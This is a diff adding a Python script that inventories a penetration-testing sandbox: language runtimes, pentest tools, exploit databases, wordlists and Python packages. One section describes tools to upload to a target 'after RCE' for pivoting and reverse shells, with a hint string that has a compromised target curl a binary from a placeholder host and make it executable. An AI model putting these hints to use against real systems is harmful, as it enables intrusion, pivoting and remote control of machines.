@@ -1,0 +1,254 @@
+#!/usr/bin/env python3
+"""Print a structured JSON summary of available tools, runtimes, and exploit resources.
+
+This script is mounted into the sandbox at /opt/tpt-tools/env-info.
+It can be updated without rebuilding the Docker image.
+"""
+import subprocess
+import json
+import shutil
+import os
+import glob as glob_mod
+
+
+def ver(cmd, timeout=5):
+    """Run a command and return its first output line."""
+    try:
+        r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
+        out = (r.stdout + r.stderr).strip().splitlines()
+        return out[0][:120] if out else "ok"
+    except FileNotFoundError:
+        return None
+    except Exception as e:
+        return f"error: {e}"
+
+
+def check_tool(name, version_cmd=None):
+    """Check if a tool exists and optionally get its version."""
+    path = shutil.which(name)
+    if not path:
+        return None
+    if version_cmd:
+        return ver(version_cmd)
+    return path
+
+
+info = {}
+
+# ── Language Runtimes ─────────────────────────────────────────────────────
+info["python"] = {}
+for v in ["python3", "python2.7", "python2", "python3.13", "python3.14"]:
+    r = ver([v, "--version"]) if shutil.which(v) else None
+    if r:
+        info["python"][v] = r
+
+info["node"] = {}
+node_path = shutil.which("node")
+if node_path:
+    info["node"]["default"] = ver(["node", "--version"])
+# Check n-managed versions
+n_dir = "/usr/local/n/versions/node"
+if os.path.isdir(n_dir):
+    for d in sorted(os.listdir(n_dir)):
+        nbin = os.path.join(n_dir, d, "bin", "node")
+        if os.path.exists(nbin):
+            info["node"][f"v{d}"] = ver([nbin, "--version"])
+# jsfuck
+try:
+    r = subprocess.run(
+        ["node", "-e", "const J=require('jsfuck'); console.log('ok '+typeof J.JSFuck.encode)"],
+        capture_output=True, text=True, timeout=5,
+        env={**os.environ, "NODE_PATH": os.environ.get("NODE_PATH", "/usr/lib/node_modules")}
+    )
+    info["node"]["jsfuck"] = "available" if "ok" in r.stdout else "missing"
+except Exception:
+    info["node"]["jsfuck"] = "error"
+
+info["java"] = {}
+# System default
+java_ver = ver(["java", "-version"])
+if java_ver:
+    info["java"]["default"] = java_ver
+# Named versions
+for name in ["java8", "java11", "java17", "java21"]:
+    if shutil.which(name):
+        info["java"][name] = ver([name, "-version"])
+info["java"]["JAVA_HOME"] = os.environ.get("JAVA_HOME", "not set")
+# Check alternatives
+try:
+    r = subprocess.run(["update-alternatives", "--list", "java"],
+                       capture_output=True, text=True, timeout=5)
+    if r.returncode == 0:
+        info["java"]["alternatives"] = r.stdout.strip().splitlines()
+except Exception:
+    pass
+
+# ── Build Tools ───────────────────────────────────────────────────────────
+info["build"] = {}
+for tool, cmd in [("mvn", ["mvn", "--version"]), ("gradle", ["gradle", "--version"]),
+                  ("make", ["make", "--version"]), ("cmake", ["cmake", "--version"]),
+                  ("ant", ["ant", "-version"]), ("gcc", ["gcc", "--version"]),
+                  ("g++", ["g++", "--version"])]:
+    if shutil.which(tool):
+        v = ver(cmd)
+        if v:
+            info["build"][tool] = v
+
+# ── Scripting Languages ──────────────────────────────────────────────────
+info["scripting"] = {}
+for lang, cmd in [("php", ["php", "--version"]), ("perl", ["perl", "--version"]),
+                  ("ruby", ["ruby", "--version"]), ("go", ["go", "version"]),
+                  ("rustc", ["rustc", "--version"])]:
+    if shutil.which(lang):
+        v = ver(cmd)
+        if v:
+            info["scripting"][lang] = v
+
+# ── Pentest Tools ─────────────────────────────────────────────────────────
+pentest = {}
+categories = {
+    "recon": ["nmap", "masscan", "whatweb", "wpscan", "nikto", "httpx",
+              "amass", "subfinder", "katana", "nuclei", "wafw00f"],
+    "fuzzing": ["ffuf", "feroxbuster", "gobuster", "dirb", "dirsearch", "wfuzz"],
+    "sqli": ["sqlmap", "ghauri"],
+    "exploitation": ["msfconsole", "commix", "searchsploit"],
+    "brute_force": ["hydra", "john", "hashcat", "medusa"],
+    "network": ["curl", "wget", "netcat", "nc", "ncat", "socat",
+                "openssl", "ssh", "scp", "rsync", "proxychains4", "chisel"],
+    "ad_pentest": ["impacket-secretsdump", "impacket-psexec", "impacket-wmiexec",
+                   "impacket-smbexec", "impacket-dcomexec", "impacket-atexec",
+                   "impacket-getTGT", "impacket-getST", "impacket-GetNPUsers",
+                   "impacket-GetUserSPNs", "crackmapexec", "evil-winrm",
+                   "bloodhound-python", "certipy", "bloodyAD"],
+    "web_tools": ["jwt_tool", "flask-unsign"],
+    "misc": ["git", "jq", "xxd", "base64", "strings", "file", "binwalk", "foremost"],
+}
+for cat, tools in categories.items():
+    found = [t for t in tools if shutil.which(t)]
+    if found:
+        pentest[cat] = found
+info["pentest_tools"] = pentest
+
+# ── Transferable Tools (can be uploaded to targets via HTTP/base64) ────────
+transferable = {}
+transfer_candidates = [
+    ("chisel", "SOCKS tunnel pivot tool, upload to target after RCE for internal network access"),
+    ("ncat", "Netcat with SSL support, useful for reverse shells"),
+    ("socat", "Bidirectional data relay, useful for port forwarding"),
+    ("busybox", "Multi-tool binary, useful on minimal target environments"),
+]
+for tool_name, desc in transfer_candidates:
+    path = shutil.which(tool_name)
+    if path and os.path.isfile(path):
+        size_mb = os.path.getsize(path) / (1024 * 1024)
+        transferable[tool_name] = {
+            "path": path,
+            "size": f"{size_mb:.1f}MB",
+            "desc": desc,
+            "transfer_hint": f"Sandbox: cd {os.path.dirname(path)} && python3 -m http.server 9002 &  |  Target: curl http://YOUR_IP:9002/{tool_name} -o /tmp/{tool_name} && chmod +x /tmp/{tool_name}",
+        }
+info["transferable_tools"] = transferable
+
+# ── Exploit Resources ─────────────────────────────────────────────────────
+exploit_tools = {}
+exploit_dir = "/opt/exploit-tools"
+if os.path.isdir(exploit_dir):
+    for f in os.listdir(exploit_dir):
+        fpath = os.path.join(exploit_dir, f)
+        if os.path.isfile(fpath):
+            size_mb = os.path.getsize(fpath) / (1024 * 1024)
+            exploit_tools[f] = f"{fpath} ({size_mb:.1f}MB)"
+        elif os.path.isdir(fpath):
+            nfiles = sum(1 for _ in os.scandir(fpath))
+            exploit_tools[f] = f"{fpath}/ ({nfiles} files)"
+info["exploit_tools"] = exploit_tools
+
+# ── Offline CVE/Exploit Databases ─────────────────────────────────────────
+offline_dbs = {}
+# searchsploit (ExploitDB local mirror)
+if shutil.which("searchsploit"):
+    sdb_path = "/usr/share/exploitdb"
+    if os.path.isdir(sdb_path):
+        try:
+            n_exploits = int(subprocess.run(
+                ["bash", "-c", f"find {sdb_path}/exploits -type f 2>/dev/null | wc -l"],
+                capture_output=True, text=True, timeout=10
+            ).stdout.strip() or "0")
+        except Exception:
+            n_exploits = 0
+        offline_dbs["searchsploit"] = {
+            "path": sdb_path,
+            "exploits_count": n_exploits,
+            "usage": "searchsploit <product> [version]",
+            "example": "searchsploit thinkphp 5.0",
+        }
+    else:
+        offline_dbs["searchsploit"] = "installed but exploitdb not found"
+# Metasploit modules
+msf_modules = "/usr/share/metasploit-framework/modules"
+if os.path.isdir(msf_modules):
+    try:
+        n_exploits = int(subprocess.run(
+            ["bash", "-c", f"find {msf_modules}/exploits -type f -name '*.rb' 2>/dev/null | wc -l"],
+            capture_output=True, text=True, timeout=10
+        ).stdout.strip() or "0")
+    except Exception:
+        n_exploits = 0
+    offline_dbs["metasploit"] = {
+        "modules_path": msf_modules,
+        "exploit_modules": n_exploits,
+    }
+# nmap scripts
+nse_dir = "/usr/share/nmap/scripts"
+if os.path.isdir(nse_dir):
+    try:
+        n_scripts = int(subprocess.run(
+            ["bash", "-c", f"ls {nse_dir}/*.nse 2>/dev/null | wc -l"],
+            capture_output=True, text=True, timeout=5
+        ).stdout.strip() or "0")
+    except Exception:
+        n_scripts = 0
+    offline_dbs["nmap_scripts"] = {"path": nse_dir, "count": n_scripts}
+# nuclei templates
+nuclei_tmpl = os.path.expanduser("~/nuclei-templates")
+if not os.path.isdir(nuclei_tmpl):
+    nuclei_tmpl = "/root/nuclei-templates"
+if os.path.isdir(nuclei_tmpl):
+    offline_dbs["nuclei_templates"] = nuclei_tmpl
+info["offline_databases"] = offline_dbs
+
+# ── Wordlists ─────────────────────────────────────────────────────────────
+wordlists = {}
+wl_paths = [
+    ("/usr/share/seclists", "seclists"),
+    ("/usr/share/wordlists", "wordlists"),
+    ("/usr/share/wordlists/rockyou.txt", "rockyou"),
+    ("/usr/share/seclists/Discovery/Web-Content/common.txt", "common.txt"),
+    ("/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt", "dirlist-medium"),
+]
+for path, name in wl_paths:
+    if os.path.exists(path):
+        if os.path.isfile(path):
+            size_mb = os.path.getsize(path) / (1024 * 1024)
+            wordlists[name] = f"{path} ({size_mb:.1f}MB)"
+        else:
+            wordlists[name] = path
+info["wordlists"] = wordlists
+
+# ── Python Packages (pentest-relevant) ────────────────────────────────────
+py_packages = {}
+check_pkgs = [
+    "requests", "pycryptodome", "flask_unsign", "jwt", "jose",
+    "paramiko", "bs4", "lxml", "httpx", "aiohttp",
+    "itsdangerous", "jinja2", "mako", "pymysql", "psycopg2",
+    "redis", "pymongo", "bloodhound", "impacket", "dnspython", "netaddr",
+]
+for pkg in check_pkgs:
+    try:
+        __import__(pkg)
+        py_packages[pkg] = "available"
+    except ImportError:
+        pass
+info["python_packages"] = py_packages
+
+print(json.dumps(info, indent=2))
